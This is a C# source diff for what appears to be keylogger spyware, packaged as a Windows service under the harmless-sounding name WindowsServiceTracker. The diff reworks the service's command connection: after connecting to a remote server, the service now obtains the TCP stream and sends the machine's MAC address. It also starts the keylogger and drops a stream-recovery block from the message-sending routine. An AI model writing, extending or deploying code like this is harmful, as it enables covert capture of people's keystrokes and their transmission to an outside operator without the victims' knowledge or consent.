@@ -43,7 +43,7 @@ namespace WindowsServiceTracker
         private KeyloggerCommInterface pipeProxy;
         private Thread tcpThread;
         private volatile bool tcpKeepAlive = true;
-        private String macAddress;
+        private volatile String macAddress = null;
 
         //private Keylogger keylog = new Keylogger();
 
@@ -73,8 +73,6 @@ namespace WindowsServiceTracker
 
             StartKeylogger(); //todo remove after debugging
             Thread.Sleep(30000);
-
-            macAddress = getMacAddress();
 
             tcpThread = new Thread(this.MaintainServerConnection);
             tcpThread.Start();
@@ -148,6 +146,7 @@ namespace WindowsServiceTracker
         //make a thread based on this method to connect to the server and read/write to the tcp connection
         private void MaintainServerConnection()
         {
+            macAddress = getMacAddress();
             int waitToRetry = 0;
             int bufferSize = 1;
             byte[] buffer = new byte[bufferSize];
@@ -159,6 +158,8 @@ namespace WindowsServiceTracker
                     {
                         Connect();
                         waitToRetry = 0;
+                        getTcpStream();
+                        SendStringMsg(macAddress);
                     }
                     catch (Exception)
                     {
@@ -276,16 +277,6 @@ namespace WindowsServiceTracker
 
         private bool SendStringMsg(String stringMsg)
         {
-            if (tcp != null && (tcpStream == null || !tcpStream.CanWrite))
-            {
-                try
-                {
-                    tcpStream = tcp.GetStream();
-                }
-                catch (InvalidOperationException)
-                { }
-            }
-
             if (tcpStream != null && tcpStream.CanWrite)
             {
                 Byte[] msg = Encoding.UTF8.GetBytes(stringMsg + Environment.NewLine);
